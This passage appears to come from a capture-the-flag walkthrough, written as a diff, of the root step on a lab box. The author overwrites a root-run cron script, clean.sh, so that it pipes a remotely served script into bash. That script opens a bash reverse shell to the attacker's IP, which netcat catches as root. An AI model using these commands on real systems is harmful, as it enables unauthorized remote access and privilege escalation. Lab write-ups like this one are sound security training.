+cat /var/log/dpkg.log 
+nano /opt/clean/clean.sh 
+nano /opt/clean/clean.sh 
+exit
+exit
+
+
+## MAYBE THERE IS SOME TYPE OF CRONJOB IS RUNNING IN THE BACKGROUND WHICH IS USING "CLEAN.SH" FILE
+
+## LETS EDIT THIS FILE WITH OUR REVERSE SHELL:
+------------------------------------------------
+
+root@7546fa2336d6:/opt/clean# cat clean.sh 
+#!/bin/bash
+
+curl 10.8.73.218/rev.sh | bash
+root@7546fa2336d6:/opt/clean# 
+
+## LETS CREATE A FILE NAMED "REV.SH" ON OUR SERVER AND RUN A PYTHON SERVER
+----------------------------------------------------------------------------
+
+# cat rev.sh 
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.8.73.218/4444 0>&1
+
+## GOT A CONNECTION BACK:
+--------------------------
+
+# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.185.132] 40004
+bash: cannot set terminal process group (2421): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cat-pictures:~# 
+
+##  WE ARE ROOT!!
+## GOT THE "FLAG 2" 
+
+
